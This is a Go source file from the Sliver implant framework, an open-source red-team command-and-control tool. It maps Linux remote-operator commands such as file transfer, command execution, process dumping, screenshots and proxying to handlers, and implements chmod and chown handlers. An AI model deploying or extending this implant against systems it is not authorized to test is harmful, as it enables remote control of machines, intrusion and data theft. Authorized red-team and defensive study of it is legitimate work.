package handlers

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"os"
	"os/user"
	"syscall"
	"strconv"
	"io/fs"
	"path/filepath"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"google.golang.org/protobuf/proto"

	// {{if .Config.Debug}}
	"log"
	// {{end}}
)

var (
	linuxHandlers = map[uint32]RPCHandler{
		sliverpb.MsgPsReq:        psHandler,
		sliverpb.MsgTerminateReq: terminateHandler,
		sliverpb.MsgPing:         pingHandler,
		sliverpb.MsgLsReq:        dirListHandler,
		sliverpb.MsgDownloadReq:  downloadHandler,
		sliverpb.MsgUploadReq:    uploadHandler,
		sliverpb.MsgCdReq:        cdHandler,
		sliverpb.MsgPwdReq:       pwdHandler,
		sliverpb.MsgRmReq:        rmHandler,
		sliverpb.MsgMkdirReq:     mkdirHandler,
		sliverpb.MsgMvReq:        mvHandler,
		sliverpb.MsgTaskReq:      taskHandler,
		sliverpb.MsgIfconfigReq:  ifconfigHandler,
		sliverpb.MsgExecuteReq:   executeHandler,
		sliverpb.MsgEnvReq:       getEnvHandler,
		sliverpb.MsgSetEnvReq:    setEnvHandler,
		sliverpb.MsgUnsetEnvReq:  unsetEnvHandler,

		sliverpb.MsgScreenshotReq: screenshotHandler,

		sliverpb.MsgNetstatReq:  netstatHandler,
		sliverpb.MsgSideloadReq: sideloadHandler,

		sliverpb.MsgReconfigureReq: reconfigureHandler,
		sliverpb.MsgSSHCommandReq:  runSSHCommandHandler,
		sliverpb.MsgProcessDumpReq: dumpHandler,

		// {{if .Config.WGc2Enabled}}
		// Wireguard specific
		sliverpb.MsgWGStartPortFwdReq:   wgStartPortfwdHandler,
		sliverpb.MsgWGStopPortFwdReq:    wgStopPortfwdHandler,
		sliverpb.MsgWGListForwardersReq: wgListTCPForwardersHandler,
		sliverpb.MsgWGStartSocksReq:     wgStartSocksHandler,
		sliverpb.MsgWGStopSocksReq:      wgStopSocksHandler,
		sliverpb.MsgWGListSocksReq:      wgListSocksServersHandler,
		// {{end}}

		// Linux Only
		sliverpb.MsgChmodReq:         chmodHandler,
		sliverpb.MsgChownReq:         chownHandler,
		sliverpb.MsgChtimesReq:       chtimesHandler,
	}
)

// GetSystemHandlers - Returns a map of the linux system handlers
func GetSystemHandlers() map[uint32]RPCHandler {
	return linuxHandlers
}

func getUid(fileInfo os.FileInfo) (string) {
	uid := int32(fileInfo.Sys().(*syscall.Stat_t).Uid)
	uid_str := strconv.FormatUint(uint64(uid), 10)
	usr, err := user.LookupId(uid_str)
	if err != nil {
		return ""
	}
	return usr.Name
}

func getGid(fileInfo os.FileInfo) (string) {
    gid := int32(fileInfo.Sys().(*syscall.Stat_t).Gid)
	gid_str := strconv.FormatUint(uint64(gid), 10)
	grp, err := user.LookupGroupId(gid_str)
	if err != nil {
		return ""
	}
	return grp.Name
}

func chmodHandler(data []byte, resp RPCResponse) {
	chmodReq := &sliverpb.ChmodReq{}
	err := proto.Unmarshal(data, chmodReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	chmod := &sliverpb.Chmod{}
	target, _ := filepath.Abs(chmodReq.Path)
	chmod.Path = target
	// Make sure file exists
	_, err = os.Stat(target)

	chmod.Response = &commonpb.Response{}
	if err == nil {
		// Convert string to octal number
		octal, err := strconv.ParseInt(chmodReq.FileMode, 8, 32)
		if err == nil {

			setuid := octal & 04000
			setgid := octal & 02000
			setstcky := octal & 01000

			// Cast the octal number to fs.FileMode
			fileMode := os.FileMode(octal)

			// Found this was necessary because the constructor above doesn't set special permissions
			if setuid > 0 {
				fileMode = fileMode | os.ModeSetuid
			}
			if setgid > 0 {
				fileMode = fileMode | os.ModeSetgid
			}
			if setstcky > 0 {
				fileMode = fileMode | os.ModeSticky
			}

			if chmodReq.Recursive {

				err := filepath.WalkDir(target, func(file string, d fs.DirEntry, err error) error {
					if err == nil {
						err = os.Chmod(file, fileMode)
						if err != nil {
							return err
						}
					} else {
						return err
					}
					return nil
				})
				if err != nil {
					chmod.Response.Err = err.Error()
				}

			} else {
				err = os.Chmod(target, fileMode)
				if err != nil {
					chmod.Response.Err = err.Error()
				}
			}
		} else {
			chmod.Response.Err = err.Error()
		}
	} else {
		chmod.Response.Err = err.Error()
	}

	data, err = proto.Marshal(chmod)
	resp(data, err)
}

func chownHandler(data []byte, resp RPCResponse) {

	// variable definitions so goto won't break
	var uid_str string
	var gid_str string
	var gid uint64
	var uid uint64
	var err error
	var usr *user.User
	var grp *user.Group

	chownReq := &sliverpb.ChownReq{}
	err = proto.Unmarshal(data, chownReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	chown := &sliverpb.Chown{}
	target, _ := filepath.Abs(chownReq.Path)
	chown.Path = target
	_, err = os.Stat(target)

	chown.Response = &commonpb.Response{}
	if err != nil {
		chown.Response.Err = err.Error()
		goto finished
	}

	uid_str = chownReq.Uid
	usr, err = user.Lookup(uid_str)
	if err != nil {
		chown.Response.Err = err.Error()
		goto finished
	}

	uid, err = strconv.ParseUint(usr.Uid, 10, 32)
	if err != nil {
		chown.Response.Err = err.Error()
		goto finished
	}

	gid_str = chownReq.Gid
	grp, err = user.LookupGroup(gid_str)
	if err != nil {
		chown.Response.Err = err.Error()
		goto finished
	}

	gid, err = strconv.ParseUint(grp.Gid, 10, 32)
	if err != nil {
		chown.Response.Err = err.Error()
		goto finished
	}

	// Check if the recursive flag is set and the path is a directory
	if chownReq.Recursive {

		err := filepath.WalkDir(target, func(file string, d fs.DirEntry, err error) error {
			if err == nil {
				err = os.Chown(file, int(uid), int(gid))
				if err != nil {
					return err
				}
			} else {
				return err
			}
			return nil
		})
		if err != nil {
			chown.Response.Err = err.Error()
		}

	} else {

		err = os.Chown(target, int(uid), int(gid))
		if err != nil {
			chown.Response.Err = err.Error()
		}
	}

finished:
	data, err = proto.Marshal(chown)
	resp(data, err)
}
